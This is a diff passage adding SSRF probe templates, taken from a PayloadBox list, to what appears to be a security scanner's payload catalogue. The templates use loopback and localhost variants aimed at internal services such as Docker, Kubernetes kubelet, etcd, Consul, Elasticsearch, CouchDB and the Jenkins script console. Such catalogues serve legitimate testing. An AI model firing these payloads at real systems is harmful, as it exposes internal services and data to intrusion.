+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0199",
+    "name": "Ssrf Injection #199",
+    "template": "http://127.0.0.1%0d",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.0.1%0d",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0200",
+    "name": "Ssrf Injection #200",
+    "template": "http://127.0.0.1%09",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.0.1%09",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0201",
+    "name": "Ssrf Injection #201",
+    "template": "http://127.0.0.1%20",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.0.1%20",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0202",
+    "name": "Ssrf Injection #202",
+    "template": "ssh://127.0.0.1",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: ssh://127.0.0.1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0203",
+    "name": "Ssrf Injection #203",
+    "template": "telnet://127.0.0.1",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: telnet://127.0.0.1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0204",
+    "name": "Ssrf Injection #204",
+    "template": "smb://127.0.0.1",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: smb://127.0.0.1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0205",
+    "name": "Ssrf Injection #205",
+    "template": "imap://127.0.0.1",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: imap://127.0.0.1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0206",
+    "name": "Ssrf Injection #206",
+    "template": "pop3://127.0.0.1",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: pop3://127.0.0.1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0207",
+    "name": "Ssrf Injection #207",
+    "template": "smtp://127.0.0.1",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: smtp://127.0.0.1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0208",
+    "name": "Ssrf Injection #208",
+    "template": "http://127.0.0.1/webdav",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.0.1/webdav",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0209",
+    "name": "Ssrf Injection #209",
+    "template": "http://localhost:80/webdav",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://localhost:80/webdav",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0210",
+    "name": "Ssrf Injection #210",
+    "template": "http://127.0.0.1:11211",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.0.1:11211",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0211",
+    "name": "Ssrf Injection #211",
+    "template": "dict://127.0.0.1:11211/stats",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: dict://127.0.0.1:11211/stats",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0212",
+    "name": "Ssrf Injection #212",
+    "template": "http://127.0.0.1:9200",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.0.1:9200",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0213",
+    "name": "Ssrf Injection #213",
+    "template": "http://127.0.0.1:9200/_cat/indices",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.0.1:9200/_cat/indices",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0214",
+    "name": "Ssrf Injection #214",
+    "template": "http://127.0.0.1:9200/_cluster/health",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.0.1:9200/_cluster/health",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0215",
+    "name": "Ssrf Injection #215",
+    "template": "http://127.0.0.1:28017",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.0.1:28017",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0216",
+    "name": "Ssrf Injection #216",
+    "template": "http://127.0.0.1:5984",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.0.1:5984",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0217",
+    "name": "Ssrf Injection #217",
+    "template": "http://127.0.0.1:5984/_utils",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.0.1:5984/_utils",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0218",
+    "name": "Ssrf Injection #218",
+    "template": "http://127.0.0.1:5984/_all_dbs",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.0.1:5984/_all_dbs",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0219",
+    "name": "Ssrf Injection #219",
+    "template": "http://127.0.0.1:2375/containers/json",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.0.1:2375/containers/json",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0220",
+    "name": "Ssrf Injection #220",
+    "template": "http://127.0.0.1:2375/images/json",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.0.1:2375/images/json",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0221",
+    "name": "Ssrf Injection #221",
+    "template": "http://localhost:2375/version",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://localhost:2375/version",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0222",
+    "name": "Ssrf Injection #222",
+    "template": "http://127.0.0.1:8001/api/v1/namespaces",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.0.1:8001/api/v1/namespaces",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0223",
+    "name": "Ssrf Injection #223",
+    "template": "http://127.0.0.1:10250/pods",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.0.1:10250/pods",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0224",
+    "name": "Ssrf Injection #224",
+    "template": "http://127.0.0.1:10255/pods",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.0.1:10255/pods",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0225",
+    "name": "Ssrf Injection #225",
+    "template": "http://127.0.0.1:8500/v1/catalog/services",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.0.1:8500/v1/catalog/services",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0226",
+    "name": "Ssrf Injection #226",
+    "template": "http://127.0.0.1:8500/v1/kv/?keys",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.0.1:8500/v1/kv/?keys",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0227",
+    "name": "Ssrf Injection #227",
+    "template": "http://127.0.0.1:8983/solr/admin/cores",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.0.1:8983/solr/admin/cores",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0228",
+    "name": "Ssrf Injection #228",
+    "template": "http://127.0.0.1:8080/script",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.0.1:8080/script",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0229",
+    "name": "Ssrf Injection #229",
+    "template": "http://127.0.0.1:8080/asynchPeople",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.0.1:8080/asynchPeople",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0230",
+    "name": "Ssrf Injection #230",
+    "template": "http://127.0.0.1:2379/v2/keys/?recursive=true",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.0.1:2379/v2/keys/?recursive=true",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0231",
+    "name": "Ssrf Injection #231",
+    "template": "http://[::ffff:7f00:1]",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://[::ffff:7f00:1]",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0232",
+    "name": "Ssrf Injection #232",
+    "template": "http://[0:0:0:0:0:ffff:127.0.0.1]",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://[0:0:0:0:0:ffff:127.0.0.1]",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0233",
+    "name": "Ssrf Injection #233",
+    "template": "http://vcap.me",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://vcap.me",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0234",
+    "name": "Ssrf Injection #234",
+    "template": "http://lvh.me",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://lvh.me",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0235",
+    "name": "Ssrf Injection #235",
+    "template": "http://lacolhost.com",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://lacolhost.com",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0236",
+    "name": "Ssrf Injection #236",
+    "template": "http://127.0.0.1:8000",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.0.1:8000",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0237",
+    "name": "Ssrf Injection #237",
+    "template": "http://127.0.0.1:8008",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.0.1:8008",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0238",
+    "name": "Ssrf Injection #238",
+    "template": "http://127.0.0.1:8081",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.0.1:8081",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0239",
+    "name": "Ssrf Injection #239",
+    "template": "http://127.0.0.1:8082",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.0.1:8082",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0240",
+    "name": "Ssrf Injection #240",
+    "template": "http://127.0.0.1:8888",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.0.1:8888",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0241",
+    "name": "Ssrf Injection #241",
+    "template": "http://127.0.0.1:9090",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.0.1:9090",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0242",
+    "name": "Ssrf Injection #242",
+    "template": "http://127.0.0.1:9999",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.0.1:9999",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  }
+]
